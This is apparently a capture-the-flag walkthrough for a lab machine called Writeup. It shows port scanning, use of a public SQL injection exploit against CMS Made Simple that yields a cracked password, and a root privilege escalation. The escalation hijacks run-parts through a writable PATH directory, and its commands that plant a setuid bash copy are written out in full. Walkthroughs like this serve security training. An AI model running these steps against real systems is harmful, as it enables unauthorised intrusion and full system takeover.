1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry 
|_/writeup/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Page check
![](images/Pasted%20image%2020241218025224.png)
Because of Donkey DoS protection, we can not use ffuf or gobuster to enumerate the web-contents.

From the robots.txt, we found the hidden web-content `/writeup`.
![](images/Pasted%20image%2020241218025332.png)
From the source code, we can find the valid version of the cms `CMS Made Simple`
`<!-- cms_stylesheet error: No stylesheets matched the criteria specified -->`

In this place, we do not know the extract version of this cms
so, I would just search the exploits about that
`CMS Made Simple < 2.2.10 - SQL Injection            | php/webapps/46635.py`
In github, there is a python3 version of exploit script
`https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3.git`
```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
```

2, shell as root
There is no `sudo` here, so we can not check `sudo -l`
So we need to check the process in the background, I would upload the `pspy64`
I decided to leave that running and ssh in again to keep looking. When I did that, I saw my ssh connection in pspy:
```
2019/06/17 01:37:09 CMD: UID=0    PID=3253   | sshd: [accepted]
2019/06/17 01:37:09 CMD: UID=0    PID=3254   | sshd: [accepted]  
2019/06/17 01:37:15 CMD: UID=0    PID=3255   | sshd: jkr [priv]  
2019/06/17 01:37:15 CMD: UID=0    PID=3256   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/06/17 01:37:16 CMD: UID=0    PID=3257   | run-parts --lsbsysinit /etc/update-motd.d
2019/06/17 01:37:16 CMD: UID=0    PID=3258   | /bin/sh /etc/update-motd.d/10-uname
2019/06/17 01:37:16 CMD: UID=0    PID=3259   | sshd: jkr [priv]  
2019/06/17 01:37:16 CMD: UID=1000 PID=3260   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3261   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3262   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3263   | -bash 
2019/06/17 01:37:16 CMD: UID=1000 PID=3264   | -bash 
```

When a user logs in, root runs sh, which runs /usr/bin/env, which provides a specific path and runs run-parts on the update-motd.d folder. I’ll immediately notice that the $PATH includes at the front the two folders I can write to:
```
ls -ld /usr/local/bin/ /usr/local/sbin/
drwx-wsr-x 2 root staff 20480 Apr 19 04:11 /usr/local/bin/
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 /usr/local/sbin/
```

And there is no absolute path of `run-parts`, so we can just write our own `run-parts` in the `/usr/local/bin/` or `/usr/local/sbin`

I will write a script to /usr/local/bin/run-parts, make sure it’s executable, and then ssh in again:
```
jkr@writeup:~$ echo -e '#!/bin/bash\n\ncp /bin/bash /bin/wither\nchmod u+s /bin/wither' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
jkr@writeup:~$ cat /usr/local/bin/run-parts
#!/bin/bash

cp /bin/bash /bin/wither
chmod u+s /bin/wither
```

Then just restart the ssh
`/bin/wither -p` , we can get the root shell.
